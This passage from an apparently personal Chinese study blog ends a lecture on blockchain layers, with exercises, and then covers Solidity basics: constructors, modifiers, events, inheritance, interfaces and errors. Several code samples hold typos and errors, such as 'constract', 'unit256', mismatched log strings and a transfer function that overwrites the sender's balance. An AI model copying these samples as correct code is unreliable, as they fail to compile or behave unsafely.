title="共识层"></a><strong>共识层</strong></h4><ul><li>共识层是区块链系统的核心功能层级之一，为区块链系统提供一种或多种可选的公平、高效、安全、可靠的共识算法机制</li><li>让所有的区块链网络节点都认可每次计算产生的新区块，并且协调保证所有区块链网络节点数据记录一致性，使区块链系统的整体状态达成一致</li></ul><h4 id="激励层"><a href="#激励层" class="headerlink" title="激励层"></a><strong>激励层</strong></h4><ul><li>激励层是区块链系统可选的功能层级，以比特币、以太坊为代表的区块链系统，在共识层的功能基础上，提供了奖励加密货币的激励机制</li><li>对于加入区块链网络的节点，都有一定机率在区块链状态改变（如产生新区块、部署智能合约、智能合约被调用等）时被区块链系统增发奖励一定数量的加密货币</li><li>但是，以超级账本为代表的联盟链系统更多用于解决联盟内跨组织的信任服务问题，不需要类似奖励加密货币的激励机制。</li></ul><h4 id="合约层"><a href="#合约层" class="headerlink" title="合约层"></a>合约层</h4><ul><li><p>合约层是区块链系统的核心功能层级之一，智能合约是将基于区块链的应用系统业务逻辑以可编程脚本或高级语言代码的形式开发后，由区块链系统的合约层负责对智能合约代码进行动态部署运行，并由系统根据既定规则的条件触发和自动执行，智能合约的源代码、调用过程与执行结果都会被记录到区块链上，杜绝合约篡改和抵赖。</p></li><li><p>智能合约机制使区块链从最初单一的加密货币应用，延伸到政务服务、金融服务、征信管理、供应链管理、物联网等多个应用领域</p></li></ul><h4 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a>接口层</h4><ul><li>接口层定义了区块链系统对应用层和外部的服务API和管理接口。</li><li>服务API对区块链系统的功能进行封装，采用如RESTful、gRPC等远程调用协议，为应用层或外部系统提供跨平台、 便捷的区块链系统服务调用机制。</li><li>区块链系统一般还提供命令行或Web服务接口，方便客户端或节点与区块链系统进行交互</li></ul><h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><ul><li><p><strong>应用层包括基于区块链的各类应用，与区块链系统的类型密切相关</strong>。</p></li><li><p><strong>对于公有链来说</strong>，最普遍的应用就是比特币、以太币等加密货币与相关的支付、交易、结算、工具等应用，以及基于智能合约的去中心化DApp应用。</p></li><li><p><strong>对于联盟链来说</strong>，更多的应用是实现跨组织或组织与个人之间的对等信任服务与数字资产化，比如跨行业联盟的征信管理、供应链上下游溯源管理、跨多个政府单位的政务协同等<strong>。</strong></p></li><li><p><strong>对于私有链来说</strong>，更多的应用是实现政府、企业内部重要业务数据的不可篡改，降低内控监督成本。</p></li></ul><h2 id="区块链的价值与思维"><a href="#区块链的价值与思维" class="headerlink" title="区块链的价值与思维"></a>区块链的价值与思维</h2><h4 id="区块链的价值"><a href="#区块链的价值" class="headerlink" title="区块链的价值"></a>区块链的价值</h4><p><strong>在大幅降低第三方信任服务的成本和风险的前提下，实现信息与价值传递交换，提高服务效率，是一种创新的服务网络，是发展数字经济，构建变革性的价值生态系统的重要基础设施，具有重大的应用价值。</strong></p><p><strong>区块链技术的核心价值是什么？</strong> </p><p>用理性的技术解决参与者之间的信任问题</p><p> 1.满足保障网络诚信、隐私自主、价值激励、安全运行 和权利保护等公共需求，构建公共价值为基础的规则体系。</p><p>2.让交易在透明化，减少信息传递 成本，转变为价值传递，助理解 决中小企业贷款融资难、银行风 控难、部门监管难等问题，打造 便捷高效、稳定透明的营商环境， 为经济高质量发展提供支撑。</p><h4 id="区块链的思维方式"><a href="#区块链的思维方式" class="headerlink" title="区块链的思维方式"></a>区块链的思维方式</h4><p><strong>(1)</strong> <strong>去&#x2F;弱&#x2F;多中心化</strong></p><p>​    <strong>去中心化是研究应用区块链技术首先要建立的一种思维方式。开展一项涉及信任构建的工作，首先要思考，如果使用去中心化怎样来解决？不仅高价值数据资产及其相关计算能去中心化，普通Web数据访问存储也可以去&#x2F;弱&#x2F;多中心化。通过去&#x2F;弱&#x2F;多中心化思考，可能会获得中心化信任体系下难以获取的诸多新特性、新能力。</strong></p><p><strong>(2)</strong> <strong>透明开放</strong></p><p>​    <strong>研究应用区块链技术，在所属的共识范围内，需要机制、规则、代码的完全透明、开放，透明、开放是让共识群体积极参与的前提和基础；黑箱运行、潜藏规则或独有专利，在区块链中难以获得更大范围的共识，并难以被更多参与者所拥护。</strong></p><p><strong>(3)</strong> <strong>协同合作</strong></p><p>​    <strong>不要试图一个人或一个机构独自完成所有工作和享有所有回报，要习惯人与人之间、团队与团队之间的协同合作，共定游戏规则，共建生态，共同发展产业，共获回报。</strong></p><ol start="2"><li><strong>区块链技术的本质是什么？</strong></li></ol><p>带有验证的可扩展的分布式记账。分布式的公共账本</p><p><strong>布式账本技术</strong>：区块链是一个分布式的数据库，每个节点都保存一份完整的账本副本。通过分布式网络实现数据的冗余和备份，确保数据的安全和一致性。</p><p><strong>共识机制</strong>：区块链系统依靠共识算法来验证和确认交易，而不是依赖单一的信任方。常见的共识算法有工作量证明（PoW）、权益证明（PoS）、授权权益证明（DPoS）等。这些机制确保所有参与者对区块链的状态达成一致。</p><p><strong>加密技术</strong>：区块链利用公钥加密、哈希函数等密码学技术来确保交易的安全性和隐私性。加密技术保证了数据的不可篡改性和参与者的匿名性。</p><p><strong>链式结构</strong>：区块链由一系列区块按时间顺序串联而成，每个区块包含若干交易记录和一个指向前一区块的哈希值。这个链式结构确保了数据的不可篡改性。</p><p><strong>智能合约</strong>：智能合约是部署在区块链上的自执行代码，它们按照预定的规则自动执行和验证交易。这使得区块链不仅是一个数据存储系统，更是一个可编程的平台，能够实现复杂的业务逻辑。                                                                         </p><ol start="3"><li><strong>什么是区块链分叉</strong></li></ol><p>​区块链分叉是指由于某种原因，从区块链的某个区块开始，后续的区块构成了两条子链。</p><p>​<strong>主要原因</strong></p><ol><li><strong>区块链软件升级</strong></li></ol><p>​节点系统升级有先有后，旧节点拒绝验证新节点产生的区块，然后新、旧节点各自延续自己认为正确的链，区块链发生永久性分歧，所以分成两条链。</p><p><img src="https://s2.loli.net/2024/11/18/hwu7W6v3IzqMjJN.png" alt="2.png"></p><ol start="2"><li><strong>区块链出块冲突</strong></li></ol><p>​    在运行过程中，如果采用PoW工作量证明之类的需要节点竞争计算新区块的出块权的共识机制，有可能<strong>出现两个独立的节点同时求解出满足要求的哈希值结果，都生成了一个新区块，导致出块冲突，使区块链发生临时分叉。</strong></p><p>​解决办法：<strong>只承认分叉中最长的链（哪一边分叉先生成下一个区块，哪一边就是最长的链），不是最长链的分叉中的区块将被抛弃成为孤块（Orphan Block）</strong></p><h3 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h3><p><strong>（一）填空题</strong></p><p><strong>1.</strong> <strong>区块链是将分布式计算与存储、</strong>     <strong>、智能合约</strong> <strong>、</strong>     <strong>、网络安全等多种计算机技术相互融合的应用技术创新。</strong></p><p><strong>2.</strong> <strong>信任服务模式可以分为无中介熟人信任、第三方信任和</strong>       <strong>等3种类型。</strong></p><p><strong>3.</strong> <strong>区块链分为</strong>      <strong>、</strong>     <strong>与私有链3种不同类型。</strong></p><p><strong>4.</strong>            <strong>区块链系统是世界上首个经过大规模、长时间检验的加密货币系统。</strong></p><p><strong>5.</strong> <strong>比特币系统的发行量每四年减半，总量上限为</strong>      <strong>万枚，无法被超发。</strong></p><p><strong>6.</strong> <strong>在区块链系统逻辑架构中，自下而上可以分为存储层、</strong>     <strong>、网络层、</strong>    <strong>、激励层、</strong>    <strong>、接口层、应用层。</strong></p><p><strong>7.</strong> <strong>在区块链系统中，每个存储区块链与账本数据的网络节点都</strong></p><p><strong>是</strong>        <strong>关系，节点之间会共享</strong>          <strong>数据。</strong></p><p><img src="https://s2.loli.net/2024/11/18/ZG8bhIlad69ukPg.png" alt="5.png"><img src="https://s2.loli.net/2024/11/18/1uMA4jKpbomwCFe.png" alt="6.png"></p><p><strong>（三）简答题</strong></p><p><strong>1.</strong> <strong>请简述什么是区块链</strong>？</p><p><strong>2.</strong> <strong>请简述区块链的特点有哪些</strong>？</p><p><strong>3.</strong> <strong>请简述区块链有哪些类型？不同类型的区块链之间有什么区别</strong>？</p><p><strong>4.</strong> <strong>区块链分叉是指由于某种原因，从区块链的某个区块开始，后续的区块构成了两条子链，请简述导致区块链分叉的主要原因</strong>？</p><p><strong>5.</strong> <strong>请简述什么是软件系统架构</strong>？</p><p><strong>6.</strong> <strong>请简述区块链系统逻辑架构包含哪些功能层级</strong>？</p><p><strong>7.</strong> <strong>请简述什么是基于区块链的思维方式</strong>？</p><p><strong>8.</strong> <strong>请简述区块链有什么价值</strong>？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>solidity基础002</title>
      <link href="/2024/11/11/solidity%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/"/>
      <url>/2024/11/11/solidity%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关键词：constructor&amp;Modifier  event 继承 接口 异常 重载 库合约 引用 回调</p><h3 id="构造函数constructor和修饰器Modifier"><a href="#构造函数constructor和修饰器Modifier" class="headerlink" title="构造函数constructor和修饰器Modifier"></a>构造函数constructor和修饰器Modifier</h3><h4 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h4><p>  定义：<strong>是一种特殊函数 每个合约可以定义一个，并且在部署合约时自动运行一次。</strong></p><p>可用于初始化合约参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    string public symbol;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    //带参数的构造函数用于初始化状态变量</span><br><span class="line">    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;            // Token name</span><br><span class="line">        symbol = _symbol;        // Token symbol</span><br><span class="line">        totalSupply = _initialSupply;  // 设置初始代币供应量</span><br><span class="line">        owner = msg.sender;      // 将部署者设置为合约的拥有者owner</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Modifier"><a href="#Modifier" class="headerlink" title="Modifier"></a>Modifier</h4><p>定义：<strong>类似于decorator，声明函数拥有的特性，并减少代码冗余</strong></p><p>主要使用场景： <strong>运行函数前的检查，例如地址，变量，余额等。</strong></p><p>定义一个叫做onlyOwner的modifier：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//定义modifier</span><br><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == owner);//检查调用者是否为owner地址</span><br><span class="line">  _;// 如果是的话，继续运行函数主体；否则报错并revert交易</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>带有onlyOwner修饰符的函数只能被owner地址调用</strong></p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//改变owner</span><br><span class="line">function changeOwner(address_newOwner) external onlyOwner&#123;</span><br><span class="line">  owner = _newOwner;// 只能owner地址运行这个函数，并改变owner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在以上函数中，由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p><h3 id="事件event"><a href="#事件event" class="headerlink" title="事件event"></a>事件event</h3><ol><li><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4></li></ol><ul><li>响应： 应用程序（ether.js)可以通过RPC接口订阅和监听这些事件，并在前端做响应。</li><li>经济：事件是<strong>EVM</strong>上比较经济的存储数据的方式，每个大概消耗2,000 <strong>gas</strong>；相比之下，链上存储一个新变量至少需要20,000 <strong>gas</strong>。</li></ul><ol start="2"><li><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li><strong>日志记录</strong>：事件在链上作为日志记录保存，不能被智能合约读取，但可供外部观察。</li><li><strong>通知机制</strong>：前端应用、DApp 等可以监听事件来响应合约的变化，如更新用户余额、确认交易等。</li><li><strong>优化 Gas 消耗</strong>：事件的存储成本低于状态变量的修改，因此在某些应用场景下，使用事件记录是更高效的选择。</li></ul></li><li><h4 id="声明事件"><a href="#声明事件" class="headerlink" title="声明事件"></a>声明事件</h4></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Event + 事件名称 + (变量类型 变量名,变量类型 变量名,...)</span><br></pre></td></tr></table></figure><p>​以REC20代币合约的Transfer事件为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from,address indexed to,uint256 value);</span><br><span class="line">//from:转账地址</span><br><span class="line">//to:接收地址</span><br><span class="line">//value:转账数量</span><br><span class="line">//其中from&amp;to前面带有indexed关键字，他们会保存在以太坊虚拟机日志的topics中，方便之后检索</span><br></pre></td></tr></table></figure><ol start="4"><li><h4 id="释放事件"><a href="#释放事件" class="headerlink" title="释放事件"></a>释放事件</h4></li></ol><p>释放事件（Emit Event）是指在区块链上发布特定事件通知的操作。</p><p>通过释放事件，合约可以在发生某些操作（如状态改变、资金转移等）时，向链上日志系统发送记录。</p><p>事件通常用于通知外部应用程序，如前端应用或监听工具，便于监控合约状态的变化</p><p><strong>关键字</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Emit</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//定义_transfer函数，执行转账逻辑</span><br><span class="line">function_tranfer(</span><br><span class="line">address from,</span><br><span class="line">address to;</span><br><span class="line">uint256 amount</span><br><span class="line">)external&#123;</span><br><span class="line"></span><br><span class="line">    _balance[from] = 10000000;//给转账地址一些初始代币</span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    //释放事件</span><br><span class="line">    emit Transfer(from,to,amount);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><h4 id="EVM日志"><a href="#EVM日志" class="headerlink" title="EVM日志"></a>EVM日志</h4></li></ol><p>​     <strong>EVM用日志log来存储solidity事件，每条日志记录包括主题topics和数据data两部分</strong></p><p>​5.1 <strong>主题topics</strong>（？)</p><p>​<span style = "color: red;"><strong>用于描述事件，长度不能超过4。它的第一个元素是事件的签名（哈希）</strong></span></p><p>​     eg: 例如对于上面的transfer事件，它的事件哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keccak256(&quot;Transfer(address,address,unit256)&quot;)</span><br><span class="line"></span><br><span class="line">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></pre></td></tr></table></figure><p>​<strong>除了事件哈希，主题还可以包含<span style = "color: red;">至多3个indexed参数</span>，也就是Transfer事件中的from和to。</strong></p><p>​    5.2 <strong>数据data</strong></p><p>​<strong>事件中不带 indexed的参数会被存储在 data 部分中</strong>，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topics 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topics 更少。</p><p>​5.3 <strong>在Etherscan上查询事件</strong></p><p>当尝试用**_transfer()<strong>函数在</strong>Sepolia<strong>测试网络上转账100代币，可以在</strong>Etherscan<strong>上查询到相应的</strong>tx**：<a href="https://sepolia.etherscan.io/tx/0xb07dcd9943662e2e8b17c7add370f046401962ce24d0690a61bb249a385dc8c9#eventlog">网址</a>。</p><p>​点击<strong>Logs</strong>按钮，就能看到事件明细</p><p>​Topics里面有三个元素，[0]是这个事件的哈希，[1]和[2]是我们定义的两个indexed变量的信息，即转账的转出地址和接收地址。Data里面是剩下的不带indexed的变量，也就是转账数量。</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ol><li><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4></li></ol><p>1.1  <strong>virtual</strong></p><p>​父合约中的函数，如果希望子合约重写，需要加上<strong>virtual</strong>关键字。</p><p>1.2 <strong>override</strong>：</p><p>​子合约重写了父合约中的函数，需要加上<strong>override</strong>关键字。</p><p><strong>注意</strong>：用<strong>override</strong>修饰<strong>public</strong>变量，会重写与变量同名的<strong>getter</strong>函数</p><ol start="2"><li><h4 id="简单继承"><a href="#简单继承" class="headerlink" title="简单继承"></a>简单继承</h4></li></ol><p>​先写一个简单的A合约</p><p>​再定义一个B合约，让他继承A合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract B is A</span><br></pre></td></tr></table></figure><ol start="3"><li><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4></li></ol><p>​规则：</p><ol><li><p><strong>继承时要按辈分最高到最低的顺序排</strong>。</p><p>eg:比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba</span><br></pre></td></tr></table></figure><p>而不能写成contract Erzi is Baba, Yeye，不然就会报错。</p></li><li><p><strong>如果某一个函数在多个继承的合约里都存在，在子合约里必须重写，不然会报错</strong></p></li><li><p><strong>重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字</strong></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override(Yeye, Baba)</span><br></pre></td></tr></table></figure><h4 id="4-修饰器的继承"><a href="#4-修饰器的继承" class="headerlink" title="4. 修饰器的继承"></a>4. <strong>修饰器的继承</strong></h4><p>​用法与函数继承类似，在相应的地方加virtual和override关键字即可。</p><h4 id="5-构造函数的继承"><a href="#5-构造函数的继承" class="headerlink" title="5. 构造函数的继承"></a>5. 构造函数的继承</h4><p>​子合约有两种方法继承父合约的构造函数:</p><pre><code>1. **在继承时声明父构造函数的参数**</code></pre><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract B is A(1)</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>在子合约的构造函数中声明构造函数的参数</strong></li></ol><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li><h4 id="调用父合约的继承"><a href="#调用父合约的继承" class="headerlink" title="调用父合约的继承"></a>调用父合约的继承</h4></li></ol><p>​子合约有两种方式调用父合约的函数：</p><ol><li><strong>直接调用</strong></li></ol><p>​子合约直接用<strong>父合约名.函数名（）</strong>的方式来调用父合约函数</p><p>eg: Yeye.pop()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>Super关键字</strong></li></ol><p>​子合约可以利用**super.函数名()**来调用最近的父合约函数。</p><p>eg:</p><p>​当Solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">super.pop();</span><br><span class="line">//此处调用的是Baba.pop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li><h4 id="钻石继承"><a href="#钻石继承" class="headerlink" title="钻石继承"></a><strong>钻石继承</strong></h4></li></ol><p>​指一个派生类同时有两个或两个以上的基类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">yeye</span><br><span class="line">/  \</span><br><span class="line">babamama</span><br><span class="line">\  /</span><br><span class="line"> me</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye&#123;</span><br><span class="line"></span><br><span class="line">event Log(string message);</span><br><span class="line"></span><br><span class="line">function foo() public virtual&#123;</span><br><span class="line">emit Log(&quot;Yeye.foo called&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function bar() public virtual&#123;</span><br><span class="line">emit Log(&quot;Yeye.foo called&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//baba继承yeye</span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">function foo() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Baba.foo called&quot;);</span><br><span class="line">super.foo();</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function bar() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Eve.bar called&quot;);</span><br><span class="line">super.bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//mama继承yeye</span><br><span class="line">contract Mama is Yeye&#123;</span><br><span class="line">function foo() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Baba.foo called&quot;);</span><br><span class="line">super.foo();</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function bar() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Mama.bar called&quot;);</span><br><span class="line">super.bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//me继承mama baba</span><br><span class="line">contract me is Baba,mama&#123;</span><br><span class="line">function foo() public override(Baba,Mama)&#123;</span><br><span class="line">super.foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() public override(Baba,Mama)&#123;</span><br><span class="line">super.bar();</span><br><span class="line">//此处Super.bar会依次调用baba,mama最后是god合约</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(当然现实辈分关系具体不是这样，只是代指三个层次)</p><p>所谓钻石，即<strong>虽然Baba,Mama都是Yeye的子合约，但整个过程中，God合约只会被调用一次</strong></p><p>(因为solidity强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序)</p><h3 id="抽象合约"><a href="#抽象合约" class="headerlink" title="抽象合约"></a><strong>抽象合约</strong></h3><p>​如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体**{}<strong>中的内容，则必须将该合约标为</strong>abstract**，不然编译会报错。</p><p>未实现的函数需要加<strong>virtual</strong>，以便子合约重写。拿插入排序合约为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为<strong>abstract</strong>，之后让别人补写上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">constract Sort&#123;</span><br><span class="line"></span><br><span class="line">abstract constract Insertsort&#123;</span><br><span class="line">function insertionSort(uint[] memory a)public pure virtual returns(uint[] memory)&#123;</span><br><span class="line">/*for(uint i = 0; i &lt; a.length;i++)&#123;</span><br><span class="line">uint temp = a[i];</span><br><span class="line">uint j = i;</span><br><span class="line">while(j &gt; 0 &amp;&amp; temp &lt;a[j - 1])&#123;</span><br><span class="line">a[j] = a[j - 1];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">a[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">*/</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*Solidity中最常用的变量类型是uint，也就是正整数，取到负值的话，会报underflow错误。而在插入算法中，变量j有可能会取到-1，引起报错。这里，我们需要把j加1，让它无法取到负值。*/</span><br></pre></td></tr></table></figure><h3 id="接口（interface）"><a href="#接口（interface）" class="headerlink" title="接口（interface）"></a><strong>接口</strong>（interface）</h3><p><strong>规则</strong>：</p><pre><code>1. 接口不能包含状态变量1. 不能包含构造函数1. 不能继承除接口外的其他合约1. 所有函数都必须是external且不能有函数体1. 继承接口的非抽象合约必须实现接口定义的所有功能</code></pre><p>接口提供了两个重要的信息：</p><ol><li>合约里每个函数的<strong>bytes4</strong>选择器，以及函数签名<strong>函数名(每个参数类型）</strong>。</li><li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li></ol><p>另外，接口与合约<strong>ABI</strong>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<strong>ABI</strong>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>，也可以将<strong>ABI json</strong>文件转换为<strong>接口sol</strong>文件。</p><p><strong>接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。</strong></p><p>什么时候使用接口：</p><p>我们不需要知道它的源代码，只需知道它的合约地址，用对应的接口就可以与它交互。都可以写模版并且减少代码冗余。</p><h3 id="三种抛出异常"><a href="#三种抛出异常" class="headerlink" title="三种抛出异常"></a><strong>三种抛出异常</strong></h3><h4 id="1-error"><a href="#1-error" class="headerlink" title="1. error"></a><strong>1. error</strong></h4><p>​可以在contract之外定义异常。</p><p>Eg : 我们定义一个<strong>TransferNotOwner</strong>异常，当用户不是代币<strong>owner</strong>的时候尝试转账，会抛出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); *//* *自定义error*</span><br></pre></td></tr></table></figure><p>我们也可以定义一个<strong>携带参数的异常</strong>，来提示尝试转账的账户地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(address sender); // 自定义的带参数的error</span><br></pre></td></tr></table></figure><p><strong>在执行当中，error必须搭配revert（回退）命令使用</strong></p><h4 id="2-Require"><a href="#2-Require" class="headerlink" title="2. Require"></a>2. Require</h4><p>​它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高</p><p>使用方法：</p><figure class="highlight 